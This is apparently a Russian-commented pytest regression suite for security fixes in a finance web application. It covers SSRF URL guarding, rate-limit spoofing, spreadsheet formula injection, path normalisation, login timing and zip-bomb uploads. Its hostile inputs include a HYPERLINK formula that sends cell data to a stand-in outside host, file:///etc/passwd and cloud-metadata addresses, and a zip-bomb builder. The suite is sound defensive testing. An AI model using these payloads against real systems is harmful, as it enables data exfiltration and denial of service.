"""Изъяны, найденные при разборе безопасности, и защита от их возвращения.

Каждый класс — про одну находку: что было можно и почему теперь нельзя.
Тесты написаны так, чтобы падать при откате исправления, а не просто
подтверждать текущее поведение.
"""
from __future__ import annotations

import io
import time

import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from app.models import Base
from app.services import access, ratelimit, urlguard
from app.services.tabular import defuse_formula, to_csv, to_xlsx


@pytest.fixture()
def session():
    engine = create_engine("sqlite://")
    Base.metadata.create_all(engine)
    factory = sessionmaker(bind=engine, expire_on_commit=False)
    with factory() as active:
        access.ensure_builtin_roles(active)
        yield active


# ----------------------------------------------------------------------
# Запрос от сервера по чужому адресу (SSRF)
# ----------------------------------------------------------------------
class TestOutboundUrlGuard:
    """Адрес вебхука задаёт человек, а ходит по нему сервер — изнутри сети."""

    def test_file_scheme_is_refused(self):
        """file:///etc/passwd в поле адреса читал файл с диска сервера."""
        with pytest.raises(urlguard.UnsafeUrl, match="http"):
            urlguard.check_outbound_url("file:///etc/passwd")

    @pytest.mark.parametrize(
        "url",
        [
            "ftp://example.com/x",
            "gopher://example.com/x",
            "data:text/plain,x",
            "//example.com/x",
            "example.com/x",
            "",
        ],
    )
    def test_only_http_and_https_pass(self, url):
        with pytest.raises(urlguard.UnsafeUrl):
            urlguard.check_outbound_url(url)

    @pytest.mark.parametrize(
        "host",
        [
            "127.0.0.1",       # сам терминал
            "localhost",       # он же именем
            "10.0.0.5",        # локальная сеть
            "192.168.1.1",     # она же
            "172.16.0.1",      # и она же
            "169.254.169.254",  # служебный адрес облака: отдаёт токены ВМ
            "[::1]",           # loopback шестой версии
            "0.0.0.0",
        ],
    )
    def test_internal_addresses_are_refused(self, host):
        with pytest.raises(urlguard.UnsafeUrl):
            urlguard.check_outbound_url(f"http://{host}/hook")

    def test_cloud_metadata_is_named_in_the_refusal(self):
        """Отказ должен объяснять, почему адрес не годится."""
        with pytest.raises(urlguard.UnsafeUrl, match="внутренний"):
            urlguard.check_outbound_url("http://169.254.169.254/token")

    def test_service_ports_are_refused(self):
        for port in (22, 5432, 6379):
            with pytest.raises(urlguard.UnsafeUrl, match="Порт"):
                urlguard.check_outbound_url(f"http://example.com:{port}/hook")

    def test_public_address_passes(self):
        assert urlguard.check_outbound_url("https://8.8.8.8/hook", resolve=False)
        assert urlguard.is_safe("https://hooks.slack.com/services/x", resolve=False)

    def test_name_resolving_inside_is_refused(self):
        """Имя в публичном домене вправе указывать на 127.0.0.1."""
        assert not urlguard.is_safe("http://localhost.localdomain/hook")

    def test_is_safe_never_raises(self):
        assert urlguard.is_safe("file:///etc/passwd") is False
        assert urlguard.is_safe("не адрес вовсе") is False


class TestWebhookDelivery:
    """Проверка стоит и перед самой отправкой, а не только при сохранении."""

    def test_unsafe_url_is_not_requested(self, monkeypatch):
        from app.services import treasury_extras

        called = []
        monkeypatch.setattr(
            treasury_extras.urllib.request,
            "build_opener",
            lambda *a, **k: called.append(True),
        )
        assert treasury_extras._post_webhook("file:///etc/hostname", {"a": 1}) is False
        assert not called, "запрос по запрещённому адресу всё-таки ушёл"

    def test_delivery_failure_does_not_raise(self, monkeypatch):
        """Недоставленное уведомление не должно ронять расчёт, который его вызвал."""
        from app.services import treasury_extras

        class _Boom:
            def open(self, *a, **k):
                raise RuntimeError("что угодно")

        monkeypatch.setattr(
            treasury_extras.urllib.request, "build_opener", lambda *a, **k: _Boom()
        )
        assert treasury_extras._post_webhook("https://example.com/hook", {"a": 1}) is False


# ----------------------------------------------------------------------
# Счётчик попыток входа
# ----------------------------------------------------------------------
class _Request:
    """Заглушка запроса: заголовки и адрес сокета."""

    def __init__(self, headers=None, host="203.0.113.7"):
        self.headers = headers or {}
        self.client = type("C", (), {"host": host})()


class TestRateLimitKey:
    def setup_method(self):
        ratelimit.reset()

    def test_forwarded_for_no_longer_decides(self):
        """Раньше первый элемент X-Forwarded-For брался как адрес клиента.

        Nginx собирает этот заголовок дописыванием, поэтому первым в списке
        стоит то, что прислал клиент. Подставляя каждый раз новое значение,
        можно было подбирать пароль без счётчика вовсе.
        """
        spoofed = _Request({"x-forwarded-for": "1.2.3.4"}, host="203.0.113.7")
        assert ratelimit.client_key(spoofed) == "203.0.113.7"

    def test_real_ip_is_used_when_present(self):
        """X-Real-IP nginx проставляет заменой — подделать его снаружи нельзя."""
        request = _Request(
            {"x-real-ip": "198.51.100.9", "x-forwarded-for": "1.2.3.4"}
        )
        assert ratelimit.client_key(request) == "198.51.100.9"

    def test_socket_address_is_the_fallback(self):
        assert ratelimit.client_key(_Request()) == "203.0.113.7"

    def test_key_length_is_capped(self):
        request = _Request({"x-real-ip": "9" * 500})
        assert len(ratelimit.client_key(request)) <= 64

    def test_spoofing_no_longer_evades_the_lockout(self):
        """Каждая попытка с новым вымышленным адресом — но ключ один."""
        for attempt in range(ratelimit.MAX_ATTEMPTS):
            request = _Request({"x-forwarded-for": f"1.2.3.{attempt}"})
            key = f"ip:{ratelimit.client_key(request)}"
            ratelimit.check(key)
            ratelimit.register_failure(key)

        request = _Request({"x-forwarded-for": "1.2.3.200"})
        with pytest.raises(Exception) as info:
            ratelimit.check(f"ip:{ratelimit.client_key(request)}")
        assert info.value.status_code == 429


class TestRateLimitMemory:
    def setup_method(self):
        ratelimit.reset()

    def test_tracked_keys_stay_bounded(self):
        """Ключ строится из данных снаружи — без потолка это способ съесть память."""
        for index in range(ratelimit.MAX_TRACKED_KEYS * 2):
            ratelimit.register_failure(f"login:polzovatel-{index}")
        tracked = len(ratelimit._failures) + len(ratelimit._locked_until)
        assert tracked <= ratelimit.MAX_TRACKED_KEYS + 1, tracked

    def test_eviction_keeps_the_lockouts(self):
        """Выбрасывать надо неудавшиеся попытки, а не уже пойманных."""
        for _ in range(ratelimit.MAX_ATTEMPTS):
            ratelimit.register_failure("login:poimannyi")
        for index in range(ratelimit.MAX_TRACKED_KEYS + 100):
            ratelimit.register_failure(f"login:prochii-{index}")
        with pytest.raises(Exception) as info:
            ratelimit.check("login:poimannyi")
        assert info.value.status_code == 429


# ----------------------------------------------------------------------
# Формулы в выгрузке
# ----------------------------------------------------------------------
class TestFormulaInjection:
    """Строки в выгрузке терминал не сочинял: они из загруженных файлов и форм."""

    @pytest.mark.parametrize(
        "value",
        [
            '=HYPERLINK("http://chuzhoi.example/?"&A1,"смотри")',
            "+1+1",
            "-2+3",
            "@SUM(A1)",
            "\t=1+1",
        ],
    )
    def test_formula_start_is_defused(self, value):
        assert defuse_formula(value).startswith("'")

    def test_ordinary_text_is_untouched(self):
        for value in ("Счёт 40702", "ООО «Вектор»", "12 300,00", "", "а=б"):
            assert defuse_formula(value) == value

    def test_csv_export_defuses(self):
        columns = [{"code": "name", "title": "Счёт", "kind": "text"}]
        rows = [{"name": '=HYPERLINK("http://chuzhoi.example","клик")'}]
        text = to_csv(columns, rows).decode("utf-8")
        assert '"\'=HYPERLINK' in text, text

    def test_xlsx_export_defuses(self):
        from openpyxl import load_workbook

        columns = [{"code": "name", "title": "Счёт", "kind": "text"}]
        rows = [{"name": "=1+1"}]
        sheet = load_workbook(io.BytesIO(to_xlsx(columns, rows))).active
        assert sheet["A2"].value == "'=1+1"

    def test_numbers_stay_numbers(self):
        """Обезвреживание не должно превращать суммы в текст."""
        from openpyxl import load_workbook

        columns = [{"code": "sum", "title": "Сумма", "kind": "number", "digits": 2}]
        sheet = load_workbook(
            io.BytesIO(to_xlsx(columns, [{"sum": -1234.5}]))
        ).active
        assert sheet["A2"].value == -1234.5

    def test_ledger_sheet_defuses_account_names(self, session):
        """Наименование счёта приходит из загруженной ведомости."""
        from datetime import date

        from openpyxl import load_workbook

        from app.models import LedgerRow
        from app.services import calendar_matrix as matrix

        session.add(
            LedgerRow(
                load_date=date(2026, 3, 17),
                account="40702810500000000777",
                account_name='=HYPERLINK("http://chuzhoi.example","клик")',
                debit_turnover=100.0,
            )
        )
        session.commit()

        result = matrix.matrix(session)
        ledger = matrix.ledger_sheet(session, on_date=date(2026, 3, 17))
        book = load_workbook(io.BytesIO(matrix.build_workbook(result, ledger)))
        assert book["Счета"]["B4"].value.startswith("'=")


# ----------------------------------------------------------------------
# Нормализация пути при проверке раздела
# ----------------------------------------------------------------------
class TestPathNormalisation:
    @pytest.mark.parametrize(
        "path",
        [
            "/api//bonds/analysis",
            "/api/./bonds/analysis",
            "/api/x/../bonds/analysis",
            "/API/BONDS/analysis",
            "/api/bonds/analysis/",
            "/api///bonds//analysis",
        ],
    )
    def test_odd_spellings_do_not_slip_through(self, path):
        """Ту же ручку другой записью адреса открыть нельзя."""
        assert not access.path_allowed(path, ["calendar"])

    def test_normalisation_does_not_widen_the_match(self):
        """Похожий, но другой путь остаётся другим."""
        assert access.path_allowed("/api/bondsX", ["calendar"])

    def test_allowed_section_still_opens(self):
        assert access.path_allowed("/api/bonds/analysis", ["bonds"])
        assert access.path_allowed("/api//bonds//analysis", ["bonds"])


# ----------------------------------------------------------------------
# Перечисление логинов по времени ответа
# ----------------------------------------------------------------------
class TestLoginTiming:
    def test_missing_login_takes_as_long_as_a_real_one(self, session):
        """Разница во времени выдавала, какие учётные записи заведены."""
        from fastapi import HTTPException

        from app.services.auth import create_user, login

        create_user(session, login="realnyi", password="dlinnyi-parol-realnogo")

        def probe(name: str) -> float:
            start = time.perf_counter()
            try:
                login(session, name, "nevernyi-parol-dlya-proby")
            except HTTPException:
                pass
            return time.perf_counter() - start

        existing = min(probe("realnyi") for _ in range(3))
        missing = min(probe("nesushchestvuyushchii") for _ in range(3))
        # До исправления разница была трёхсоткратной. Требуем, чтобы ответ по
        # несуществующему логину занимал хотя бы половину времени обычного
        assert missing > existing * 0.5, (
            f"существующий {existing * 1000:.1f} мс, "
            f"несуществующий {missing * 1000:.1f} мс"
        )

    def test_disabled_account_is_also_slow(self, session):
        """Иначе по времени видно, что учётная запись есть, но отключена."""
        from fastapi import HTTPException

        from app.services.auth import create_user, login

        user = create_user(session, login="otklyuchennyi", password="parol-otklyuchennogo")
        user.active = False
        session.commit()

        start = time.perf_counter()
        with pytest.raises(HTTPException):
            login(session, "otklyuchennyi", "nevernyi-parol")
        assert time.perf_counter() - start > 0.005


# ----------------------------------------------------------------------
# Загрузка книги, которая разворачивается в непомерный объём
# ----------------------------------------------------------------------
def _bomb(unpacked_mb: int = 200) -> bytes:
    """Маленький архив с огромным содержимым."""
    import zipfile

    payload = b"<x>" + b"A" * (unpacked_mb * 1024 * 1024) + b"</x>"
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("[Content_Types].xml", '<?xml version="1.0"?><Types/>')
        archive.writestr("xl/worksheets/sheet1.xml", payload)
    return buffer.getvalue()


class TestUploadBomb:
    """Предел на размер загрузки от сжатого файла не спасает."""

    def test_bomb_is_refused(self):
        from app.services import uploads

        content = _bomb()
        assert len(content) < 12 * 1024 * 1024, "должна проходить прежний предел"
        with pytest.raises(uploads.UnsafeUpload, match="разворачивается"):
            uploads.check_archive(content)

    def test_ordinary_workbook_passes(self):
        from openpyxl import Workbook

        from app.services import uploads

        book = Workbook()
        sheet = book.active
        for row in range(1, 400):
            sheet.append([f"Счёт {row}", row * 1.5, "Наименование счёта клиента"])
        buffer = io.BytesIO()
        book.save(buffer)
        uploads.check_archive(buffer.getvalue())

    def test_csv_is_not_an_archive(self):
        from app.services import uploads

        uploads.check_archive("счёт;сумма\n40702;100\n".encode("utf-8"))

    def test_broken_archive_is_reported(self):
        from app.services import uploads

        with pytest.raises(uploads.UnsafeUpload, match="повреждён"):
            uploads.check_archive(b"PK\x03\x04" + b"musor" * 50)
